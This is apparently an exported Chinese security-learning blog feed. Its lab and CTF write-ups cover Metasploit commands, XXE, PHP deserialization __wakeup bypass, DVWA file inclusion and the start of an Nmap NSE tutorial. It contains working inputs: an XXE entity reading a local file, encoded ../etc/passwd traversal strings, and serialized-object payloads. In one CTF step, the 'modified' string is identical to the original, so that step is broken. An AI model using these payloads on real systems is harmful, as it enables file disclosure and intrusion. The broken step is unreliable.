<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200415213228796.png" alt="在这里插入图片描述"><br>3. 导入自己的模块<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">loadpath  要导入文件的路径</span><br></pre></td></tr></table></figure>

<h2 id="命令路由流量"><a href="#命令路由流量" class="headerlink" title="命令路由流量"></a>命令路由流量</h2><p><code>route</code>  指定session添加路由流量，这样就可以我不能访问的地方通过路由流量就是比如拿到的shell访问<br>这个就不演示了，在百度上搜索<strong>Metasploit  route</strong>就能找到</p>
<h2 id="做编程开发的工作"><a href="#做编程开发的工作" class="headerlink" title="做编程开发的工作"></a>做编程开发的工作</h2><p><code>puts</code>命令这个在后面在说</p>
<h2 id="导入资源文件"><a href="#导入资源文件" class="headerlink" title="导入资源文件"></a>导入资源文件</h2><p><code>resource</code>命令和<code>-r</code>参数</p>
<ol>
<li>resource命令<br>这个命令就是叫配置好的文件直接运行到要指定的模块</li>
</ol>
<p><strong>列文件内容</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083418952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">resource  要导入的文件.rc</span><br></pre></td></tr></table></figure>
<p>可以看到他就自己用文件的内容进行配置了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083509739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2. -r参数<br>如果没有进入msf命令台里面<br>我们就可以启动msf时加上-r参数<br>列</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole -r 要指定的文件</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200416083834689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>Metasploit</category>
      </categories>
      <tags>
        <tag>渗透工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title>3.XXE漏洞原理和实战复现</title>
    <url>/2020/10/16/3.XXE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%92%8C%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="下载靶场"><a href="#下载靶场" class="headerlink" title="下载靶场"></a>下载靶场</h2><p><a href="https://www.lanzoux.com/i0Txnhgnxgf">https://www.lanzoux.com/i0Txnhgnxgf</a></p>
<p>文件在<code>xxe-lab-master\php_xxe</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201016083547.png"></p>
<h2 id="xxe-lab-master靶场实战"><a href="#xxe-lab-master靶场实战" class="headerlink" title="xxe-lab-master靶场实战"></a>xxe-lab-master靶场实战</h2><p>我们用户密码都输入<code>admin</code><br>用burp截断<br>可以看到是一个自定义的标签<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201016084139.png"><br>我们故意修改一下标签<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201016084319.png"><br>提交他报错了可以看到他就是xml<br>![])(<a href="https://gitee.com/wZass/zp/raw/master/img/20201016084343.png">https://gitee.com/wZass/zp/raw/master/img/20201016084343.png</a>)</p>
<p>我在靶场文件里面添加一个a.txt文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201016084704.png"></p>
<p>我们修改成这样</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">user</span> [<span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///C:/a.txt&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>叫<code>c:/a.txt</code>内容给读出来了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201016090322.png"></p>
<h2 id="xxe预防"><a href="#xxe预防" class="headerlink" title="xxe预防"></a>xxe预防</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web安全</category>
        <category>XXE漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>3.信息收集之钟馗之眼搜索引擎</title>
    <url>/2020/10/29/3.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>钟馗之眼可以说是国产版的<strong>Shodan</strong></p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p><strong>他的使用官方是有介绍的</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029081325.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029081922.png"><br><strong>或者在开发里面有有详细的介绍</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029082149.png"><br>他还有导航直接可以查询<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201029085832.png"></p>
<p>他和<strong>Shodan</strong>语法差不多可以参考我这个点笔记<a href="https://wzass.gitee.io/2020/10/29/2.%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8BShodan%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/">2.信息收集之Shodan搜索引擎/</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>信息收集</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>3.序列化漏洞复现</title>
    <url>/2020/10/19/3.%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="wakeup-失效漏洞原理和复现"><a href="#wakeup-失效漏洞原理和复现" class="headerlink" title="__wakeup()失效漏洞原理和复现"></a>__wakeup()失效漏洞原理和复现</h2><p>__wakeup()函数说明在<a href="https://wzass.gitee.io/2020/10/20/2.%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E4%B9%8B%E9%AD%94%E6%B3%95%E5%87%BD%E6%95%B0/">2.序列化漏洞之魔法方法</a><br><strong>漏洞影响</strong><br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>序列化后的字符串对象属性个数的值大于真实个数的属性就会<code>__wakeup</code>失效<br>比如<br>下面这个没有修改的<code>__wakeup</code>正常执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:2:&#123;s:3:&quot;url&quot;;s:3:&quot;aaa&quot;;s:6:&quot;twourl&quot;;s:3:&quot;bbb&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>下面我顺便修改一个长度什么都可以改成<code>1000</code>就会<code>__wakeup</code>失效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:1000:&#123;s:3:&quot;url&quot;;s:3:&quot;aaa&quot;;s:6:&quot;twourl&quot;;s:3:&quot;bbb&quot;;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__wakeup魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line">	&#125;   </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化并输出出来</span></span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>输出的结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020204845.png"><br>输出的是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Site&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;cccc</span><br></pre></td></tr></table></figure>
<p><strong>然后进行反序列化</strong><br><strong>下面是正常的反序列化</strong><br>上面的序列化的字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;Site&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;url&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;aaaa&quot;</span>;&#125;cccc</span><br></pre></td></tr></table></figure>
<p>全部代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__wakeup魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line">	&#125;   </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化并输出出来</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">$c=unserialize(<span class="string">&#x27;O:4:&quot;Site&quot;:1:&#123;s:3:&quot;url&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//输出反序列化的内容</span></span><br><span class="line">var_dump($c);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020205527.png"><br>字符串是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bbbbobject(Site)#2 (1) &#123; [&quot;url&quot;]&#x3D;&gt; string(3) &quot;aaa&quot; &#125; cccccccc</span><br></pre></td></tr></table></figure>

<p><strong>修改里面属性个数的值大于真实个数</strong><br>修改前</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:1:&#123;s:3:&quot;url&quot;;s:4:&quot;aaaa&quot;;&#125;cccc</span><br></pre></td></tr></table></figure>
<p>修改后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:100:&#123;s:3:&quot;url&quot;;s:4:&quot;aaaa&quot;;&#125;cccc</span><br></pre></td></tr></table></figure>
<p><strong>下面就用修改后的来反序列化</strong></p>
<p>全部代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">	<span class="comment">//公用变量</span></span><br><span class="line">	<span class="keyword">public</span> $url = <span class="string">&quot;aaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//__wakeup魔法方法</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;bbbb&quot;</span>;</span><br><span class="line">	&#125;   </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cccc&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化该类的对象</span></span><br><span class="line">$a= <span class="keyword">new</span> Site();</span><br><span class="line"><span class="comment">//序列化并输出出来</span></span><br><span class="line"><span class="comment">//echo serialize($a);</span></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line">$c=unserialize(<span class="string">&#x27;O:4:&quot;Site&quot;:100:&#123;s:3:&quot;url&quot;;s:3:&quot;aaa&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="comment">//输出反序列化的内容</span></span><br><span class="line">var_dump($c);</span><br></pre></td></tr></table></figure>
<p>结果可以看见已经没有了__wakeup()<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020210104.png"></p>
<h2 id="ctf例题”unserialize3”"><a href="#ctf例题”unserialize3”" class="headerlink" title="ctf例题”unserialize3”"></a>ctf例题”unserialize3”</h2><p>地址<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4821&page=1">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=4821&amp;page=1</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020202314.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $flag = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>结果<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020211218.png"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>我们修改里面属性个数的值大于真实个数就可以了<br>修改后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;xctf&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;flag&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;111&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201020211437.png"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>序列化漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>3.手动挖掘漏洞，文件包含漏洞</title>
    <url>/2019/09/22/3.%E6%89%8B%E5%8A%A8%E6%8C%96%E6%8E%98%E6%BC%8F%E6%B4%9E%EF%BC%8C%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>任务087：手动漏洞挖掘（三）</p>
<p>手动漏洞挖掘一定要大量的进行尝试在尝，有的时候一天都找不到漏洞也是属于正常的</p>
<h2 id="文件包含漏洞描述"><a href="#文件包含漏洞描述" class="headerlink" title="文件包含漏洞描述"></a>文件包含漏洞描述</h2><ul>
<li><p><strong>Directory traversal (目录便利)</strong><br>目录便利漏洞： 正常情况下都是访问www里的文件。通过URL地址和参数地址从而访问到www以外的目录或文件，要是你用权限比较高的话运行服务器那么访问其他目录的权限就比较高就是服务器软件的权限</p>
</li>
<li><p><strong>File include(文件包含)</strong><br>文件包含漏洞：比如php的include函数他可以吧www文件以外的目录 include到页面里，其实正常情况下程序员不会这样设计程序的，通常是设计有漏洞导致的include函数过滤不严格所导致的</p>
</li>
<li><p><strong>文件包含和目录便利都是可以查看到其他目录的文件，有的人都会把他搞成一样，其实详细来说是有区别的</strong></p>
<ul>
<li><strong>明显特征</strong><br>URL里如果有？配置=文件名就要注意了，后面的值是页面文件，这样可能就存在漏洞的地<br>列如URL里有<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?page&#x3D;a.php   </span><br><span class="line">?home&#x3D;b.html</span><br><span class="line">?file&#x3D;content</span><br></pre></td></tr></table></figure>


</li>
</ul>
</li>
</ul>
<pre><code> 这个file=文件名就要警戒起来，可能也是通过 include函数来调用的
也有可能=页面文件名的也可能是在www文件里的都是也可以修改如?page=其他文件，看看能不能叫其他文件包含过来</code></pre>
<h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>实验靶机metasploitable-linux-2.0.0里面的DVWA</p>
<h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p>可以看到这个URL<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190917114503517.png" alt="在这里插入图片描述"><br><strong>漏洞测试本地文件包含显示<code>/etc/passwd</code>的内容</strong><br>使用怎么参数来显示<code>../../../../../../../../..//etc/passwd</code><br>前是这个<code>../</code>是进入到上个目录的命令多个<code>../</code>，其实和<code>cd  ..</code>一样<br>下面是<code>../../../../../../../../../</code>他的作用<br>一个<code>../</code>效果<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091719494691.png" alt="在这里插入图片描述"><br>多个<code>../</code></p>
<p>一个就是会到上一个目录二个就是会到上上层目录<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190917195314213.png" alt="在这里插入图片描述"><br>这个<code>../../../../../../../../..//etc/passwd</code>就是像从最低目录开始查看<code>/etc/passwd</code><br>可以看到页面已经出现passwd文件的内容了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091719582369.png" alt="在这里插入图片描述"><br>其实linux都是从/目录开始不像win系统所以服务器是linux系统可以应为靶机就是linux系统可以直接标明绝对路径就可以了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190917202129122.png" alt="在这里插入图片描述"><br>使用这个URL<code>///etc/passwd</code>来查看passwd<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190917202826367.png" alt="在这里插入图片描述"></p>
<h3 id="编码绕过字符，过滤"><a href="#编码绕过字符，过滤" class="headerlink" title="编码绕过字符，过滤"></a><strong>编码绕过字符，过滤</strong></h3><p><strong>有的web发现你访问的是文件名的时候可能就会自动添加.php<br>比如我们要访问/etc/passwd他就会自动添加/etc/passwd.php就会导致文件访问说没有这个文件<br>有的web版本添加”.”和”%00”后面加上这两个的其中一个有可能就吧自动添加.php省略掉，这个%00就等于空字符，遇到%00后的后面的所有字符都被省略了</strong><br><strong>服务器过滤128一下的码都是不被URL过滤的都是可以在URL正常显示的服务器不会过滤的</strong><br><strong>.和/是有可能是被过滤的</strong><br>linux目录都是<code>/什么什么/什么什么</code>，而win系统都是<code>c:\什么什么\什么什么</code><br>常用的绕过过滤的都是使用URL编码来绕过过滤，有的时候一层URL编码没有绕过那就在URL 后在进行一层URL编码也就是二层URL编码，都是你的编码要服务器能识别出来，所有要大量尝试方法。<br>下面是<code>../URL</code>编码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091809504460.png" alt="在这里插入图片描述"></p>
<p> 使用URL编码来查看/etc/passwd<br><code>../</code>编码成了<code>%2e%2e%2f</code><br>成这样<code>%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd</code><br>还是可以正常查看 的<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190918100256522.png" alt="在这里插入图片描述"><br><code>../</code>双层编码<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190918100623120.png" alt="在这里插入图片描述"><br><code>../</code>双层编码来查看<code>/etc/passwd</code><br><code>../</code>双层编码后变成<code>%25%32%65%25%32%65%25%32%66</code><br>成这样<br><code>%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66/etc/passwd</code><br>可以看到是访问不成功的应为这个靶机服务器只能解码一层<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190918101534234.png" alt="在这里插入图片描述"><br>本地文件包含只能查看文不能执行文件，其实不然很多情况下也可以执行代码的<br>本地文件下面演示一下代码执行，有很多种方法，下面就演示其中常适用用的一种这个应为我没有找到所有</p>
<h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>先做一次验证在kali用nc监听80端口<br>nc -nvlp 80<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190922205050546.PNG" alt="在这里插入图片描述"><br>在靶机是请求会请求到kali这个服务器上<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190922205607166.PNG" alt="在这里插入图片描述"><br>看见kali已经看到请求了<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190922205650630.PNG" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>手动挖掘漏洞</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>3，nmap，NSE脚本格式和编写</title>
    <url>/2020/08/30/3nmapNSE%E8%84%9A%E6%9C%AC%E6%A0%BC%E5%BC%8F%E5%92%8C%E7%BC%96%E5%86%99/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="书名诸神之眼NMAP-学习笔记"><a href="#书名诸神之眼NMAP-学习笔记" class="headerlink" title="书名诸神之眼NMAP 学习笔记"></a>书名诸神之眼NMAP 学习笔记</h2><h2 id="编辑器安装"><a href="#编辑器安装" class="headerlink" title="编辑器安装"></a>编辑器安装</h2><ol>
<li>halcyon编辑器安装<br>官方<a href="https://halcyon-ide.org/">https://halcyon-ide.org/</a><br>linux安装</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># install dependencies </span><br><span class="line">apt-get install default-jre</span><br><span class="line">apt-get install ant</span><br><span class="line"></span><br><span class="line"># clone from git</span><br><span class="line">cd &#x2F;opt</span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;s4n7h0&#x2F;Halcyon.git</span><br><span class="line"></span><br><span class="line"># compile the source </span><br><span class="line">cd Halcyon&#x2F;</span><br><span class="line">ant</span><br><span class="line">java -cp &#x2F;opt&#x2F;Halcyon&#x2F;src&#x2F;lib&#x2F;autocomplete.jar:&#x2F;opt&#x2F;Halcyon&#x2F;src&#x2F;lib&#x2F;rsyntaxtextarea.jar:&#x2F;opt&#x2F;Halcyon&#x2F;dist&#x2F;Halcyon_IDE_v2.0.1.jar halcyon.ide.HalcyonIDE    </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605105248226.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_emhhb19zZV9haS5naXRlZS5pbw==,size_20,color_006400,t_70" alt="加粗样式"><br>2. 创建<br><strong>1.添加</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605105416542.png" alt="在这里插入图片描述"></p>
<p><strong>2.创建，名字，类型</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605110411911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>2.2是选择的类型</strong><br>上面照片1是选择的类型，下面这个是所有的类型<img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605111130915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>3. 结果</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/2020060510551865.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="编写简单的NSE脚本"><a href="#编写简单的NSE脚本" class="headerlink" title="编写简单的NSE脚本"></a>编写简单的NSE脚本</h2><ol>
<li>首先添加description字段，这里只是一段介绍性的文字，用于说明脚本的目的和用法，没有严格的要求，<br>description字段：这部分内容介绍该NSE的功能，在Nmap中可以使用–script-help选项来阅读其中的内容。<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605110720650.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>author字段是脚本作者的名字<br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605110836228.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
<li>如果没有特殊原因的话，license字段的内容无须修改。     liceNSE = “Same as Nmap–See <a href="https://nmap.org/book/man-legal.html&quot;">https://Nmap.org/book/man-legal.html&quot;</a><br><img src= "/img/loading2.gif" data-lazy-src="https://img-blog.csdnimg.cn/20200605110950726.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODYwODc2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
